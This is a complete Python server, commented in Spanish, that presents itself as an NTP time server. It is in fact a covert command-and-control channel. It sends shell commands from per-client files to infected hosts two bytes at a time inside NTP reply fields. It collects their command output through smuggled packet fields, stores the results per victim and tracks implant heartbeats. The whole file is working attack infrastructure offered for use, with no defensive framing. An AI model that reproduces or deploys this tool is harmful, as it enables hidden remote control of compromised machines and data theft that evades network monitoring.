import socket
import time
import struct
import threading
import os
from datetime import datetime
from pathlib import Path
from enum import Enum, auto

# ─────────────────────────────────────────────
#  Directorios de trabajo
# ─────────────────────────────────────────────
DIR_COMANDOS   = Path("comandos")    # comandos/<client_id>.txt  — uno por línea
DIR_RESULTADOS = Path("resultados")  # resultados/<client_id>/<N>_<cmd>.txt

DIR_COMANDOS.mkdir(exist_ok=True)
DIR_RESULTADOS.mkdir(exist_ok=True)


# ─────────────────────────────────────────────
#  Estados del servidor por cliente
# ─────────────────────────────────────────────
class EstadoServidor(Enum):
    ENVIANDO_COMANDO    = auto()
    ESPERANDO_RESPUESTA = auto()
    IDLE                = auto()   # todos los comandos ejecutados


# ─────────────────────────────────────────────
#  Sesión de cliente
# ─────────────────────────────────────────────
class SesionCliente:
    """Todo el estado asociado a un client_id concreto."""

    def __init__(self, client_id: str):
        self.client_id       = client_id
        self.lista_comandos  = self._cargar_comandos()
        self.indice_comando  = 0
        self.fragmento_tx    = 0
        self.estado          = (EstadoServidor.ENVIANDO_COMANDO
                                if self.lista_comandos
                                else EstadoServidor.IDLE)
        self.buffer_rx       = bytearray()
        self.ultimo_heartbeat = time.time()

    # ── carga de comandos ─────────────────────
    def _cargar_comandos(self) -> list[str]:
        ruta = DIR_COMANDOS / f"{self.client_id}.txt"
        if not ruta.exists():
            print(f"   ℹ️  Sin archivo de comandos para {self.client_id} — IDLE")
            return []
        lineas = [l.strip() for l in ruta.read_text(encoding="utf-8").splitlines()
                  if l.strip() and not l.startswith("#")]
        print(f"   📋 {len(lineas)} comando(s) cargados para {self.client_id}: {lineas}")
        return lineas

    def recargar_comandos(self):
        """Recarga los comandos pendientes del archivo (sólo los aún no ejecutados)."""
        nuevos = self._cargar_comandos()
        # Solo tomamos los que vienen después de los ya procesados
        ejecutados = self.indice_comando
        if len(nuevos) > ejecutados:
            self.lista_comandos = nuevos
            if self.estado == EstadoServidor.IDLE:
                self.estado = EstadoServidor.ENVIANDO_COMANDO
                self.fragmento_tx = 0
            print(f"   🔄 Recargados {len(nuevos)-ejecutados} nuevo(s) comando(s) para {self.client_id}")

    # ── helpers ───────────────────────────────
    def actualizar_heartbeat(self):
        self.ultimo_heartbeat = time.time()

    @property
    def comando_actual(self) -> str:
        return self.lista_comandos[self.indice_comando]

    def avanzar_comando(self):
        self.buffer_rx    = bytearray()
        self.fragmento_tx = 0
        self.indice_comando += 1
        if self.indice_comando >= len(self.lista_comandos):
            self.estado = EstadoServidor.IDLE
            print(f"   🏁 Todos los comandos ejecutados para {self.client_id} — IDLE")
        else:
            self.estado = EstadoServidor.ENVIANDO_COMANDO

    def iniciar_espera_respuesta(self):
        self.estado       = EstadoServidor.ESPERANDO_RESPUESTA
        self.buffer_rx    = bytearray()
        self.fragmento_tx = 0


# ─────────────────────────────────────────────
#  Servidor NTP con C&C encubierto
# ─────────────────────────────────────────────
class NTPServer:
    NTP_EPOCH_OFFSET = 2208988800

    # Número máximo de heartbeats perdidos antes de marcar inactivo
    MAX_HEARTBEATS_PERDIDOS = 5

    def __init__(self, host: str = '0.0.0.0', port: int = 123):
        self.host    = host
        self.port    = port
        self.sock    = None
        self.running = False
        self.lock    = threading.Lock()

        # client_id (str UUID) → SesionCliente
        self.sesiones: dict[str, SesionCliente] = {}

        # client_id → # heartbeats perdidos consecutivos
        self.heartbeats_perdidos: dict[str, int] = {}

        # client_id → activo (False = desactivado)
        self.activos: dict[str, bool] = {}

    # ── ciclo principal ───────────────────────
    def start(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.running = True
            print(f"🕐 Servidor NTP iniciado en {self.host}:{self.port}")
            print(f"📅 Hora actual: {datetime.now()}\n")

            while self.running:
                try:
                    data, addr = self.sock.recvfrom(1024)
                    t = threading.Thread(
                        target=self.handle_client,
                        args=(data, addr),
                        daemon=True
                    )
                    t.start()
                except Exception as e:
                    if self.running:
                        print(f"❌ Error en bucle principal: {e}")
        finally:
            self.stop()

    # ── manejador por petición ────────────────
    def handle_client(self, data: bytes, addr):
        # Extraer client_id de los bytes 4-19 del paquete (16 bytes UUID)
        client_id = self._extraer_client_id(data)
        ip        = addr[0]

        with self.lock:
            # ── cliente desactivado ────────────────────────────────────────────
            if client_id in self.activos and not self.activos[client_id]:
                print(f"🚫 [{client_id[:8]}…] Cliente desactivado — ignorando")
                response = self._build_base_response()
                # Reference ID especial: 0xDEAD0000 = "desactivado"
                struct.pack_into('!I', response, 12, 0xDEAD0000)
                self.sock.sendto(response, addr)
                return

            # ── sesión nueva ───────────────────────────────────────────────────
            if client_id not in self.sesiones:
                print(f"🆕 Nueva sesión: {client_id}  (IP {ip})")
                self.sesiones[client_id]           = SesionCliente(client_id)
                self.heartbeats_perdidos[client_id] = 0
                self.activos[client_id]             = True
            else:
                # Intentar recargar comandos por si se añadieron nuevos
                sesion = self.sesiones[client_id]
                if sesion.estado == EstadoServidor.IDLE:
                    sesion.recargar_comandos()

            sesion = self.sesiones[client_id]
            sesion.actualizar_heartbeat()
            self.heartbeats_perdidos[client_id] = 0

            response = self._procesar(data, addr, sesion)

        self.sock.sendto(response, addr)
        print(f"✅ [{client_id[:8]}…] Respondido a {ip}:{addr[1]}  "
              f"[estado={sesion.estado.name}]\n")

    # ── lógica central ────────────────────────
    def _procesar(self, data: bytes, addr, sesion: SesionCliente) -> bytearray:
        cliente_ack = False
        if len(data) >= 48:
            datos1 = struct.unpack_from('!I', data, 24)[0]
            datos2 = struct.unpack_from('!I', data, 28)[0]
            cliente_ack = self._leer_datos_cliente(addr[0], datos1, datos2, sesion)

        response = self._build_base_response()
        self._rellenar_reference_id(response, sesion, cliente_ack)
        return response

    def _leer_datos_cliente(self, ip, datos1, datos2, sesion: SesionCliente) -> bool:
        MARCA_RESULTADO  = 0xFFFFFFFF
        MARCA_TRANSICION = 0xFFFFFFFE

        if datos1 == MARCA_RESULTADO:
            if sesion.estado != EstadoServidor.ESPERANDO_RESPUESTA:
                return False

            num_frag  = (datos2 >> 16) & 0xFF
            mas_datos = (datos2 >> 15) & 1
            fragmento = datos2 & 0x7FFF
            byte1     = (fragmento >> 8) & 0xFF
            byte2     = fragmento & 0xFF

            if num_frag == 0:
                sesion.buffer_rx = bytearray()

            if byte1:
                sesion.buffer_rx.append(byte1)
            if byte2:
                sesion.buffer_rx.append(byte2)

            print(f"   📥 [{ip}] Frag resultado {num_frag} (más={mas_datos}): "
                  f"{bytes([byte1, byte2])}")

            if mas_datos == 0:
                try:
                    resultado = sesion.buffer_rx.decode('utf-8', errors='replace')
                except Exception:
                    resultado = repr(sesion.buffer_rx)

                print(f"\n{'='*60}")
                print(f"📋 RESULTADO '{sesion.comando_actual}' desde {sesion.client_id}:")
                print(f"{'='*60}")
                print(resultado.strip())
                print(f"{'='*60}\n")

                self._guardar_resultado(sesion.client_id, sesion.comando_actual, resultado)
                sesion.avanzar_comando()

            return False

        elif datos1 == MARCA_TRANSICION:
            print(f"   ⏸️  [{ip}] Transición — no avanzar fragmento")
            return False

        else:
            return True   # ACK implícito

    def _rellenar_reference_id(self, response: bytearray, sesion: SesionCliente,
                                cliente_ack: bool):
        if sesion.estado in (EstadoServidor.ESPERANDO_RESPUESTA, EstadoServidor.IDLE):
            struct.pack_into('!I', response, 12, 0x47505300)
            return

        cmd_bytes  = sesion.comando_actual.encode()
        total_frag = (len(cmd_bytes) + 1) // 2
        num_frag   = sesion.fragmento_tx

        if num_frag >= total_frag:
            sesion.iniciar_espera_respuesta()
            struct.pack_into('!I', response, 12, 0x47505300)
            return

        inicio     = num_frag * 2
        fin        = min(inicio + 2, len(cmd_bytes))
        frag_bytes = cmd_bytes[inicio:fin]

        datos = 0
        if len(frag_bytes) >= 2:
            datos = (frag_bytes[0] << 8) | frag_bytes[1]
        elif len(frag_bytes) == 1:
            datos = frag_bytes[0] << 8

        mas   = 1 if num_frag < total_frag - 1 else 0
        valor = (0xFF << 24) | (num_frag << 16) | (mas << 15) | datos
        struct.pack_into('!I', response, 12, valor)

        if cliente_ack:
            print(f"   📤 Frag cmd {num_frag}/{total_frag-1} (más={mas}): {frag_bytes}")
            sesion.fragmento_tx += 1
            if mas == 0:
                print(f"   ✅ Comando completo enviado: '{sesion.comando_actual}' — esperando resp.")
                sesion.iniciar_espera_respuesta()
        else:
            print(f"   🔁 Repitiendo frag cmd {num_frag} (cliente ocupado)")

    # ── heartbeat watchdog ────────────────────
    def watchdog(self, intervalo_cliente: int = 10):
        """Hilo que comprueba si los clientes han dejado de hacer heartbeat.

        intervalo_cliente: intervalo declarado por los clientes (segundos).
        Si un cliente lleva más de MAX_HEARTBEATS_PERDIDOS * intervalo_cliente
        segundos sin conectar, se desactiva.
        """
        while self.running:
            time.sleep(intervalo_cliente)
            ahora = time.time()
            with self.lock:
                for cid, sesion in list(self.sesiones.items()):
                    if not self.activos.get(cid, True):
                        continue
                    silencio = ahora - sesion.ultimo_heartbeat
                    umbral   = self.MAX_HEARTBEATS_PERDIDOS * intervalo_cliente
                    if silencio > umbral:
                        self.activos[cid] = False
                        print(f"\n⚠️  [{cid[:8]}…] Sin heartbeat durante "
                              f"{silencio:.0f}s — DESACTIVADO\n")

    # ── helpers ───────────────────────────────
    def _extraer_client_id(self, data: bytes) -> str:
        """Lee 16 bytes de los bytes 4-19 del paquete cliente, donde
        el cliente embebe su ID (packet[4:20] = id_bytes en ntp-cli.py).
        Si el paquete es demasiado corto o los bytes son todos cero,
        devolvemos un ID basado en fallback.
        """
        if len(data) >= 20:
            raw = data[4:20]
            if any(b != 0 for b in raw):
                # Decodificar como string ASCII, eliminando el relleno de nulos
                return raw.rstrip(b'\x00').decode('ascii', errors='replace')
        return "fallback-0000-0000-0000-000000000000"

    def _build_base_response(self) -> bytearray:
        r = bytearray(48)
        r[0] = 0x24
        r[1] = 1
        r[2] = 6
        r[3] = 0xFA

        t        = time.time() + self.NTP_EPOCH_OFFSET
        seconds  = int(t)
        fraction = int((t - seconds) * 2**32)
        struct.pack_into('!I', r, 40, seconds)
        struct.pack_into('!I', r, 44, fraction)
        return r

    def _guardar_resultado(self, client_id: str, comando: str, resultado: str):
        try:
            directorio = DIR_RESULTADOS / client_id
            directorio.mkdir(parents=True, exist_ok=True)

            orden    = len(list(directorio.iterdir())) + 1
            cmd_safe = comando.replace(" ", "_").replace("/", "-").replace("|", "-")
            cmd_safe = "".join(c for c in cmd_safe if c.isalnum() or c in "_-.")
            nombre   = f"{orden:03d}_{cmd_safe}.txt"
            ruta     = directorio / nombre

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            contenido = (
                f"Timestamp : {timestamp}\n"
                f"Cliente   : {client_id}\n"
                f"Comando   : {comando}\n"
                f"{'='*60}\n"
                f"{resultado.strip()}\n"
            )
            ruta.write_text(contenido, encoding="utf-8")
            print(f"   💾 Guardado en: {ruta}")
        except Exception as e:
            print(f"   ⚠️  Error guardando resultado: {e}")

    def stop(self):
        self.running = False
        if self.sock:
            self.sock.close()


# ─────────────────────────────────────────────
if __name__ == "__main__":
    server = NTPServer()
    # Watchdog en hilo separado (ajustar intervalo al del cliente)
    wt = threading.Thread(target=server.watchdog, args=(10,), daemon=True)
    wt.start()
    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()